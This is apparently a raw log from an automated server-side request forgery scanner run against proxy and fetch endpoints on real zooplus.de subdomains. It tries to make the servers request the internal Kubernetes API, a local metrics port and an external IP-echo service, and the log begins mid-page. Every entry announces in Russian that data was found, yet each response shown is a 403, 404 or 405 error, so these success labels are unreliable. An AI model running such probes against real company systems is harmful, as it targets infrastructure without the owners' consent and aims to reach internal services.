+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/request
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could 
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://kubernetes.default.svc/version
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://httpbin.org/ip
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/recently-viewed
+Test URL: http://kubernetes.default.svc/version
+Status: 405
+Data preview: {"message": "The method is not allowed for the requested URL."}
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: t.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://httpbin.org/ip
+Status: 404
+Data preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="style
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/events/sites/1
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /image/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/request
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/fetch
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/proxy
+Test URL: http://127.0.0.1:9090/metrics
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /zootopia-events/api/proxy
+Test URL: http://httpbin.org/ip
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+[!!!] ДАННЫЕ НАЙДЕНЫ!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+Subdomain: beta-www.zooplus.de
+Endpoint: /api/image/proxy
+Test URL: http://kubernetes.default.svc/version
+Status: 403
+Data preview: <html>
+<head><title>403 Forbidden</title></head>
+<body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this server.</p>
+</body>
+</html>
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+
